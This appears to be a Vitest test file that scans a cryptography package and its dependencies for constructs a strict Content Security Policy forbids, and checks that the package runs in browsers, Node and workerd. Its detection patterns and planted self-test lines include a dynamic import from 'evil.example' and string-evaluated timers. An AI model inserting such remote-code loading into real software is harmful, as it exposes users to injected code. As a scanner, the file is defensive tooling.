// Runtime constraints: the package runs unchanged in browsers, Node and workerd, and under the
// dashboard's CSP (nonce + 'strict-dynamic', Trusted Types, no 'unsafe-eval', no
// 'wasm-unsafe-eval', connect-src 'self'). Checked on src/ and on the JavaScript that every
// runtime dependency actually ships (read from node_modules, not from a README).
import { readdirSync, readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { dirname, join, relative, resolve, sep } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, test } from "vitest";
import { x25519Supported } from "../src/index";

const packageDir = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const srcDir = join(packageDir, "src");
const ownManifest = JSON.parse(readFileSync(join(packageDir, "package.json"), "utf8"));

interface Rule {
  name: string;
  pattern: RegExp;
}

const CSP_RULES: Rule[] = [
  { name: "eval", pattern: /\beval\s*\(/ },
  { name: "Function constructor", pattern: /\bnew\s+Function\s*\(|(?<![\w$.])Function\s*\(/ },
  { name: "timer (string timers are eval)", pattern: /\bset(?:Timeout|Interval|Immediate)\s*\(/ },
  { name: "WebAssembly", pattern: /\bWebAssembly\b/ },
  {
    name: "DOM or injection sink",
    pattern: /\b(?:document|window)\s*\.|\b(?:innerHTML|outerHTML|insertAdjacentHTML|srcdoc|createContextualFragment|DOMParser)\b|javascript:/,
  },
  {
    name: "network",
    pattern: /\bfetch\s*\(|\b(?:XMLHttpRequest|WebSocket|EventSource|WebTransport|RTCPeerConnection|sendBeacon|importScripts)\b|\bnew\s+(?:Shared)?Worker\s*\(/,
  },
  {
    name: "dynamic code loading",
    pattern: /\bimport\s*\(|\brequire\s*\(\s*\[|\brequire\s*\(\s*["'](?!\.{1,2}\/|@hpke\/)/,
  },
];

/** Node-only APIs that would stop the source from running in a browser or workerd. */
const PORTABILITY_RULES: Rule[] = [
  { name: "node: import", pattern: /["']node:/ },
  { name: "Buffer", pattern: /\bBuffer\b/ },
  { name: "process", pattern: /\bprocess\s*\./ },
  { name: "require", pattern: /\brequire\s*\(/ },
];

interface Allowance {
  file: RegExp;
  rule: string;
  line: RegExp;
  reason: string;
}

/** Every false positive is listed here with its reason. A stale entry fails the test too. */
const ALLOWED: Allowance[] = [
  {
    file: /@hpke\/common\/(?:esm|script)\/src\/(?:algorithm|utils\/misc)\.js$/,
    rule: "dynamic code loading",
    line: /import\("crypto"\)|require\("crypto"\)|require\(\["crypto"\]/,
    reason:
      "Node <= 18 fallback in @hpke/common's loadSubtleCrypto/loadCrypto: it loads node:crypto only when " +
      "globalThis.crypto is undefined. Browsers, workerd and Node >= 19 define globalThis.crypto, so the " +
      "branch never runs there; it performs no network access and evaluates no strings.",
  },
  {
    file: /@hpke\/common\/(?:esm|script)\/src\/identifiers\.js$/,
    rule: "Function constructor",
    line: /The supported Key Derivation Function \(KDF\) identifiers\./,
    reason: "a JSDoc comment (\"Key Derivation Function (KDF) identifiers\"), not a call",
  },
];

interface Finding {
  file: string;
  line: number;
  rule: string;
  text: string;
}

function scan(file: string, text: string, rules: Rule[]): Finding[] {
  const findings: Finding[] = [];
  text.split("\n").forEach((line, i) => {
    for (const rule of rules) {
      if (rule.pattern.test(line)) findings.push({ file, line: i + 1, rule: rule.name, text: line.trim().slice(0, 160) });
    }
  });
  return findings;
}

function filesUnder(dir: string, extensions: RegExp): string[] {
  const out: string[] = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) {
      if (entry.name !== "node_modules") out.push(...filesUnder(path, extensions));
    } else if (extensions.test(entry.name)) {
      out.push(path);
    }
  }
  return out;
}

/** The runtime dependency closure, resolved the way Node resolves it from this package. */
function runtimeDependencies(): Map<string, string> {
  const found = new Map<string, string>();
  const visit = (fromDir: string, name: string) => {
    if (found.has(name)) return;
    const manifestPath = createRequire(join(fromDir, "package.json")).resolve(`${name}/package.json`);
    const dir = dirname(manifestPath);
    found.set(name, dir);
    const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
    for (const dep of Object.keys(manifest.dependencies ?? {})) visit(dir, dep);
    for (const dep of Object.keys(manifest.optionalDependencies ?? {})) visit(dir, dep);
  };
  for (const dep of Object.keys(ownManifest.dependencies ?? {})) visit(packageDir, dep);
  return found;
}

function unexplained(findings: Finding[], used: Set<Allowance>): Finding[] {
  return findings.filter((f) => {
    const allowance = ALLOWED.find((a) => a.rule === f.rule && a.file.test(f.file.split(sep).join("/")) && a.line.test(f.text));
    if (allowance) used.add(allowance);
    return !allowance;
  });
}

describe("CSP: the scanner itself", () => {
  test("flags each forbidden construct", () => {
    const planted = [
      'eval("1")',
      'const f = new Function("return 1")',
      'Function("return this")()',
      'setTimeout("alert(1)", 0)',
      "WebAssembly.instantiate(bytes)",
      "el.innerHTML = html",
      "document.write(x)",
      'fetch("/x")',
      "new XMLHttpRequest()",
      'import("https://evil.example/x.js")',
      'require("crypto")',
    ];
    for (const line of planted) expect(scan("planted.js", line, CSP_RULES), line).not.toEqual([]);
    expect(scan("fine.js", 'import { x } from "./y.js"; const req = require("./z.js");', CSP_RULES)).toEqual([]);
  });
});

describe("CSP: no eval, Function, string timers, WebAssembly, DOM sinks or network", () => {
  test("in the package source", () => {
    const files = filesUnder(srcDir, /\.ts$/);
    expect(files.length).toBeGreaterThanOrEqual(9);
    const findings = files.flatMap((f) => scan(relative(packageDir, f), readFileSync(f, "utf8"), CSP_RULES));
    expect(findings).toEqual([]);
  });

  test("in every runtime dependency's shipped JavaScript (ESM and CommonJS builds)", () => {
    const deps = runtimeDependencies();
    expect([...deps.keys()].sort()).toEqual(["@hpke/common", "@hpke/core"]);
    const used = new Set<Allowance>();
    const findings: Finding[] = [];
    for (const [name, dir] of deps) {
      const files = filesUnder(dir, /\.(?:m|c)?js$/);
      expect(files.length, name).toBeGreaterThan(10);
      for (const file of files) {
        findings.push(...scan(join(name, relative(dir, file)), readFileSync(file, "utf8"), CSP_RULES));
      }
    }
    expect(unexplained(findings, used)).toEqual([]);
    expect(ALLOWED.filter((a) => !used.has(a)).map((a) => a.reason)).toEqual([]); // no stale allowances
  });

  test("dependencies are pinned to exact versions", () => {
    for (const [name, version] of Object.entries(ownManifest.dependencies as Record<string, string>)) {
      expect(version, name).toMatch(/^\d+\.\d+\.\d+$/);
    }
  });
});

describe("portability: browsers, Node and workerd", () => {
  test("x25519Supported() reports native X25519 in Web Crypto (true on Node)", async () => {
    expect(await x25519Supported()).toBe(true);
  });

  test("x25519Supported() is false, not an exception, when Web Crypto lacks X25519", async () => {
    const subtle = crypto.subtle;
    const importKey = subtle.importKey;
    subtle.importKey = (async () => {
      throw new DOMException("Unrecognized algorithm name", "NotSupportedError");
    }) as typeof subtle.importKey;
    try {
      expect(await x25519Supported()).toBe(false);
    } finally {
      subtle.importKey = importKey;
    }
  });

  test("the source uses no Node-only API", () => {
    const findings = filesUnder(srcDir, /\.ts$/).flatMap((f) =>
      scan(relative(packageDir, f), readFileSync(f, "utf8"), PORTABILITY_RULES),
    );
    expect(findings).toEqual([]);
  });

  test("the source is self-contained: imports are relative files in src/ or declared dependencies", () => {
    const declared = new Set(Object.keys(ownManifest.dependencies ?? {}));
    for (const file of filesUnder(srcDir, /\.ts$/)) {
      const text = readFileSync(file, "utf8");
      for (const [, specifier] of text.matchAll(/\bfrom\s+["']([^"']+)["']/g)) {
        if (specifier!.startsWith(".")) {
          const target = resolve(dirname(file), specifier!);
          expect(target.startsWith(srcDir + sep), `${file}: ${specifier}`).toBe(true);
          expect(specifier, `${file}: extensionless, so no build step or loader option is needed`).not.toMatch(/\.[cm]?[jt]s$/);
        } else {
          expect(declared.has(specifier!), `${file} imports undeclared ${specifier}`).toBe(true);
        }
      }
    }
  });
});
